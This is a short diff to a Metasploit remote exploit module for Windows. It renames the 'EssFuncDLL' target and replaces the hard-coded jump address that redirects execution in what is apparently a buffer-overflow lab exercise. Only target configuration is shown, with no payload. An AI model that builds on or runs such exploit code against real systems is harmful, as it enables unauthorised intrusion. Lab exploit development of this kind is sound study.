@@ -37,9 +37,9 @@ class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit modul
       'Platform'       => 'Win',      # Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
       'Targets'        =>     #  targets for many exploits
       [
-        [ 'EssFuncDLL-JMPESP',
+        [ 'EssFuncDLL-JMPTRGT',
           {
-            'jmptrgt' => 0x6250103B # This will be available in [target['jmpesp']]
+            'jmptrgt' => 0x6250184E # This will be available in [target['jmptrgt']]
           }
         ]
       ],
